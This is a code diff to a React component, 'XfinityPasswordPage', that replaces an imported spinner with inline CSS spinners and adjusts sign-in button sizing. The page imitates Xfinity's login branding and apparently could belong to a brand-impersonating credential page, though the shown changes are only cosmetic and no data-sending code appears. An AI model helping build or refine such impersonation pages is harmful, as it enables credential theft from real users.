@@ -1,7 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useSearchParams } from 'react-router-dom';
 import { useLogin } from '../hooks/useLogin';
-import Spinner from './common/Spinner';
 
 interface XfinityPasswordPageProps {
   onLoginSuccess?: (sessionData: any) => void;
@@ -39,7 +38,8 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
   if (!pageReady) {
     return (
       <div style={{ minHeight: '100vh', background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-        <Spinner size="lg" color="border-purple-600" />
+        <span style={{ display: 'inline-block', width: '32px', height: '32px', border: '3px solid rgba(91,35,185,0.3)', borderTopColor: '#5A23B9', borderRadius: '50%', animation: 'xspin .7s linear infinite' }} />
+        <style>{`@keyframes xspin{to{transform:rotate(360deg)}}`}</style>
       </div>
     );
   }
@@ -70,6 +70,7 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
           font-style: normal;
           font-display: swap;
         }
+        @keyframes xspin{to{transform:rotate(360deg)}}
       `}</style>
 
       <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', flex: 1, padding: '3rem 1.5rem 2rem', maxWidth: '480px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
@@ -222,12 +223,17 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
                 alignItems: 'center',
                 justifyContent: 'center',
                 gap: '0.5rem',
+                minWidth: '120px',
+                minHeight: '44px',
               }}
               onMouseEnter={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#36156F'; }}
               onMouseLeave={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#5A23B9'; }}
             >
-              {isLoading && <Spinner size="sm" color="border-white" />}
-              {isLoading ? 'Signing in...' : 'Sign in'}
+              {isLoading ? (
+                <span style={{ display: 'inline-block', width: '20px', height: '20px', border: '2px solid rgba(255,255,255,0.3)', borderTopColor: '#fff', borderRadius: '50%', animation: 'xspin .7s linear infinite' }} />
+              ) : (
+                'Sign in'
+              )}
             </button>
           </div>
         </form>
